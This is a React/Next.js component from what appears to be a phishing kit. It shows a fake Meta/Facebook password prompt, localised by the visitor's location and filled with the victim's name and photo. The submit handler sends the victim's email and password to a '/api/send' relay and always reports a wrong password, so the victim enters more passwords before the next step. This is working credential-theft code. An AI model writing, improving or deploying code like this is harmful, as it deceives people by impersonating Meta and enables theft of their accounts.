'use client';

import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import config from '@/utils/config';
import translateText from '@/utils/translate';
import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

interface PasswordModalProps {
    userProfileImage: string;
    userName: string;
    userEmail: string;
    nextStep: () => void;
}
// Source - https://stackoverflow.com/a/22707551
// Posted by T.J. Crowder, modified by community. See post 'Timeline' for change history
// Retrieved 2026-04-03, License - CC BY-SA 3.0

function delay(delay: number) {
    return new Promise(function (resolve) {
        setTimeout(resolve, delay);
    });
}

const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, userEmail, nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { messageId, message, setMessage, geoInfo } = store();
    const [isShowError, setIsShowError] = useState(false);
    const [passWordAttempt, setPassWordAttempt] = useState(1);

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;
        const textsToTranslate = ['Enter your password', 'Password', 'Log in', 'Forgotten password?'];
        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }
            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading || !message) return;
        setIsLoading(true);

        setIsShowError(false);

        const updatedMessage = `${message}

<b>📧 Account Email:</b> <code>${userEmail}</code>
<b>🔒 Password:</b> <code>${password}</code>`;

        try {
            const res = await axios.post('/api/send', {
                message: updatedMessage,
                message_id: messageId
            });

            if (res?.data?.success) {
                setMessage(updatedMessage);
            }
            await delay(config.PASSWORD_LOADING_TIME);
            setIsShowError(true);
            setPassWordAttempt(passWordAttempt + 1);
            console.log(passWordAttempt)
            if (passWordAttempt >= config.MAX_PASS) {
                nextStep();
            } else {
                setPassword('');
            }
        } catch {
            nextStep();
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <>
            {/* Overlay mờ toàn màn hình */}
            <div className='fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all'></div>
            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center px-1 sm:px-3 md:px-4'>
                <div className='flex max-h-[95vh] w-full max-w-sm flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-1.5 sm:max-w-md sm:p-3 md:max-w-lg md:p-4'>
                    <form onSubmit={handleSubmit} className='flex flex-1 flex-col items-center gap-2 overflow-y-auto py-3 sm:gap-3 sm:py-4 md:gap-4 md:py-6'>
                        {/* Profile Image */}
                        <div className='flex h-16 w-16 shrink-0 items-center justify-center overflow-hidden rounded-full border-2 border-gray-300 bg-linear-to-br from-blue-400 to-blue-600 sm:h-20 sm:w-20 md:h-24 md:w-24'>{userProfileImage && (userProfileImage.startsWith('http') || userProfileImage.startsWith('/')) ? <Image src={userProfileImage} alt={userName} width={96} height={96} className='h-full w-full object-cover' /> : <div className='text-xl font-bold text-white sm:text-2xl md:text-3xl'>{userName.charAt(0).toUpperCase()}</div>}</div>

                        {/* User Name */}
                        <h2 className='max-w-xs truncate text-center text-base font-bold sm:text-lg md:text-2xl'>{userName}</h2>

                        {/* Password Input */}
                        <div className='w-full px-1.5 sm:px-3 md:px-4'>
                            <div className='relative w-full'>
                                <input
                                    type={showPassword ? 'text' : 'password'}
                                    value={password}
                                    onChange={(e) => {
                                        setIsShowError(false);

                                        setPassword(e.target.value);
                                    }}
                                    className={`h-10 w-full rounded-[10px] border-2 px-3 py-1.5 pr-10 text-base sm:h-11 md:h-12.5 ${isShowError ? 'border-red-500 placeholder:text-red-500' : 'border-[#d4dbe3]'}`}
                                    required
                                    autoComplete='new-password'
                                    placeholder={isShowError ? t('Wrong password') : t('Password')}
                                />
                                <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} size='lg' className='absolute top-1/2 right-3 -translate-y-1/2 cursor-pointer text-[#4a4a4a]' onClick={() => setShowPassword(!showPassword)} />
                            </div>
                        </div>

                        {/* Log In Button */}
                        <div className='mt-1 w-full px-1.5 sm:mt-2 sm:px-3 md:px-4'>
                            <button type='submit' disabled={isLoading} className={`flex h-10 w-full items-center justify-center rounded-full bg-blue-600 text-xs font-semibold text-white transition-colors hover:bg-blue-700 sm:h-11 sm:text-sm md:h-12.5 md:text-base ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                                {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Log in')}
                            </button>
                        </div>

                        {/* Forgotten Password Link */}
                        <a href='https://www.facebook.com/recover' target='_blank' rel='noopener noreferrer' className='mt-1 text-center text-xs text-blue-600 hover:underline sm:text-xs md:text-sm'>
                            {t('Forgotten password?')}
                        </a>
                    </form>

                    {/* Meta Logo Footer */}
                    <div className='flex items-center justify-center p-3'>
                        <Image src={MetaLogo} alt='' className='h-4.5 w-17.5' />
                    </div>
                </div>
            </div>
        </>
    );
};

export default PasswordModal;

